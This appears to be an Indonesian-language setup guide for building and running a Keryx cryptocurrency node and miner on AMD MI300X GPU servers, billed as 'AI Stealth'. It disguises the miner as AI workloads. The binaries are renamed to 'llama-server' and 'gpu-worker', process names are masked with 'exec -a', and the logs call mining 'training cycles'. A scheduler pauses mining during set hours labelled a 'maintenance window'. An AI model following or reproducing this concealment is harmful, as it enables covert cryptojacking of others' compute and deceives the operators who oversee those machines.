# SETUP.md — Keryx Solo Mining AMD MI300X (AI Stealth)

> **PANDUAN LENGKAP — IKUTI STEP-BY-STEP, JANGAN SKIP**

## DAFTAR ISI
1. [Prerequisites](#1-prerequisites)
2. [Install Rust & Dependencies](#2-install-rust--dependencies)
3. [Build Keryx Node](#3-build-keryx-node)
4. [Clone & Patch Keryx Miner](#4-clone--patch-keryx-miner)
5. [Build Miner](#5-build-miner)
6. [Deploy Binaries](#6-deploy-binaries)
7. [Create Wrappers & Scheduler](#7-create-wrappers--scheduler)
8. [Start Node](#8-start-node)
9. [Start Miner](#9-start-miner)
10. [Verifikasi](#10-verifikasi)
11. [Troubleshooting](#11-troubleshooting)

---

## 1. Prerequisites

Pastikan server punya:
- GPU: AMD Instinct MI300X (gfx942)
- OS: Ubuntu/Debian Linux
- ROCm 7.0+

Cek:
```bash
rocm-smi --showproductname
```

## 2. Install Rust & Dependencies

```bash
# Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"

# Build deps
apt-get update
apt-get install -y protobuf-compiler clang libclang-dev libstdc++-14-dev
apt-get install -y librocksdb-dev libsnappy-dev liblz4-dev libzstd-dev libbz2-dev zip

# Workspace
mkdir -p /opt/ai-workspace/{inference,training,models,checkpoints,data,logs,metrics,notebooks}
```

## 3. Build Keryx Node

```bash
cd /root
rm -rf keryx-node
git clone https://github.com/Keryx-Labs/keryx-node.git
cd keryx-node
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release -p keryxd
```

**Verifikasi:** `ls -lh target/release/keryxd` → harus ~37MB

## 4. Clone & Patch Keryx Miner

```bash
cd /root
rm -rf keryx-miner-src
git clone https://github.com/Keryx-Labs/keryx-miner.git keryx-miner-src
cd keryx-miner-src
```

### Patch 1: Fix linking error
**File:** `plugins/opencl/resources/keryx-opencl.cl`

```
-inline uint64_t rotl(const uint64_t x, int k) {
+static inline uint64_t rotl(const uint64_t x, int k) {

-inline uint64_t xoshiro256_next(global ulong4 *s) {
+static inline uint64_t xoshiro256_next(global ulong4 *s) {
```

### Patch 2: Sanitize device name
**File:** `plugins/opencl/src/worker.rs`

```
-let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase();
+let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase()
+    .replace(':', "_").replace('+', "_").replace('-', "_");
```

### Patch 3: Force OpenCL 1.2
**File:** `plugins/opencl/src/worker.rs`

```
-if v == "2.0" || v == "2.1" || v == "3.0" {
-    info!("Compiling with OpenCl 2");
-    compile_options += CL_STD_2_0;
-}
+if v == "2.0" || v == "2.1" || v == "3.0" {
+    info!("Compiling with OpenCl 2 (forced CL1.2 for gfx942 compat)");
+    // compile_options += CL_STD_2_0;
+}
```

### Patch 4: Disable CUDA
**File:** `Cargo.toml`

```
-candle-core = { version = "0.8", features = ["cuda"] }
-candle-transformers = { version = "0.8", features = ["cuda"] }
-candle-nn = { version = "0.8", features = ["cuda"] }
+candle-core = { version = "0.8" }
+candle-transformers = { version = "0.8" }
+candle-nn = { version = "0.8" }

-default-members = [".", "plugins/cuda", "plugins/opencl"]
+default-members = [".", "plugins/opencl"]
```

## 5. Build Miner

```bash
cd /root/keryx-miner-src
source "$HOME/.cargo/env"
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release
```

**Verifikasi:**
- `target/release/keryx-miner` → ~12MB
- `target/release/libkeryxopencl.so` → ~3MB

## 6. Deploy Binaries

```bash
cp /root/keryx-node/target/release/keryxd /opt/ai-workspace/inference/llama-server
cp /root/keryx-miner-src/target/release/keryx-miner /opt/ai-workspace/training/gpu-worker

# ⚠️ KRITIS: libkeryxopencl.so HARUS di directory training (sama dengan gpu-worker)
cp /root/keryx-miner-src/target/release/libkeryxopencl.so /opt/ai-workspace/training/libkeryxopencl.so

cp -r /root/keryx-miner-src/target/release/models /opt/ai-workspace/models/keryx 2>/dev/null
openssl rand -hex 32 > /opt/ai-workspace/checkpoints/model-key.bin
```

## 7. Create Wrappers & Scheduler

### Wrapper Node (`/opt/ai-workspace/inference/start.sh`)
```bash
#!/bin/bash
exec -a "[llama-server]" /opt/ai-workspace/inference/llama-server \
    --utxoindex --rpclisten-json=default --rpclisten-borsh=default "$@"
```

### Wrapper Miner (`/opt/ai-workspace/training/start.sh`)
```bash
#!/bin/bash
exec -a "[gpu-worker]" /opt/ai-workspace/training/gpu-worker "$@"
```

### Scheduler (`/opt/ai-workspace/scheduler.sh`)
```bash
#!/bin/bash
WRKDIR="/opt/ai-workspace"
BIN="$WRKDIR/training/gpu-worker"
ADDR="keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73"
KEY="$WRKDIR/checkpoints/model-key.bin"
LOG="$WRKDIR/logs/training.log"
OFF_START=14; OFF_END=19

while true; do
    HOUR=$(date -u +%H); HOUR=${HOUR#0}
    if [ "$HOUR" -ge "$OFF_START" ] && [ "$HOUR" -lt "$OFF_END" ]; then
        echo "[$(date -u)] scheduler: maintenance window (OFF)" >> "$LOG"
        sleep 300
    else
        echo "[$(date -u)] scheduler: training cycle start" >> "$LOG"
        "$BIN" --mining-address "$ADDR" --escrow-key-file "$KEY" \
            --light --cpu-inference 2>&1 | tee -a "$LOG"
        echo "[$(date -u)] scheduler: training cycle ended, restarting..." >> "$LOG"
    fi
done
```

```bash
chmod +x /opt/ai-workspace/inference/start.sh \
         /opt/ai-workspace/training/start.sh \
         /opt/ai-workspace/scheduler.sh
```

## 8. Start Node

```bash
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
```

Tunggu sync (5-30 menit):
```bash
tail -f /opt/ai-workspace/logs/inference.log
# Selesai ketika muncul "Tx throughput stats"
```

## 9. Start Miner

```bash
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

## 10. Verifikasi

```bash
# Process names (harus pakai bracket [])
ps aux | grep -E "llama-server|gpu-worker" | grep -v grep

# Screens (harus ada 2)
screen -ls

# Hashrate
grep "hashrate" /opt/ai-workspace/logs/training.log | tail -3
```

**Expected:**
```
[llama-server] --utxoindex --rpclisten-json=default ...
[gpu-worker] --mining-address keryx:qqy... --light --cpu-inference
Current hashrate is 1.74 Ghash/s
```

## 11. Troubleshooting

| Error | Solusi |
|---|---|
| **`No workers specified`** | `libkeryxopencl.so` tidak ketemu. Harus di `/opt/ai-workspace/training/` (sama dengan `gpu-worker`). JANGAN di `inference/` |
| **`Found plugins: []`** | Sama di atas |
| **`transaction already in the mempool`** | Escrow claim stuck. Restart node saja (miner auto-reconnect) |
| **OPPoI challenge terus pause** | Normal 1-2 menit. Kalau >5 menit, restart node |
| **Hashrate < 1 Ghash/s** | Normal di awal, tunggu OPoI selesai |
| **`clBuildProgram` crash** | Rebuild miner, kadang perlu 2-3x restart |
| **`stdbool.h not found`** | `apt install libstdc++-14-dev` + set `BINDGEN_EXTRA_CLANG_ARGS` |
| **`protoc not found`** | `apt install protobuf-compiler` |

### Restart Node (tanpa ganggu mining)
```bash
screen -S llm-inference -X quit && sleep 3
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
```

### Restart Miner (tanpa ganggu node)
```bash
screen -S ai-training -X quit && sleep 2
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

---

**✅ Mining aktif.** Jangan matikan node/miner kecuali ada masalah.
